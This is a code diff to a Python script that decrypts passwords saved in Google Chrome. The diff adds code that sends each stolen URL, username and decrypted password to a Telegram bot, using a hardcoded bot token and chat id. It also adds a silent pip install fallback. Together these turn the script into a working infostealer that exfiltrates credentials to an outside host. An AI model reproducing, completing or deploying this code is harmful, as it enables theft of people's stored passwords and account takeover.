@@ -2,8 +2,13 @@ import os
 import json 
 import base64 
 import sqlite3 
-import win32crypt 
-from Crypto.Cipher import AES
+import win32crypt
+import requests
+try:
+    from Cryptodome.Cipher import AES 
+except:
+    os.system("pip install pycryptodomex")
+    
 import shutil 
 from datetime import timezone, datetime, timedelta 
 
@@ -87,10 +92,16 @@ def main():
 			print(f"Main URL: {main_url}") 
 			print(f"Login URL: {login_page_url}") 
 			print(f"User name: {user_name}") 
-			print(f"Decrypted Password: {decrypted_password}") 
-		
-		else: 
-			continue
+			print(f"Decrypted Password: {decrypted_password}")
+			bot_token = '6529573815:AAFYLvqkliEEG82zJc9_a-91-fB63n6EWKE'
+			chat_id = '6015288409' 
+			message = f"Main URL: {main_url}\nLogin URL: {login_page_url}\nUser name: {user_name}\nDecrypted Password: {decrypted_password}"
+			api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+			data = {
+        	'chat_id': chat_id,
+        	'text': message,
+    		}
+			response = requests.post(api_url, data=data)
 		
 		if date_of_creation != 86400000000 and date_of_creation: 
 			print(f"Creation date: {str(chrome_date_and_time(date_of_creation))}") 
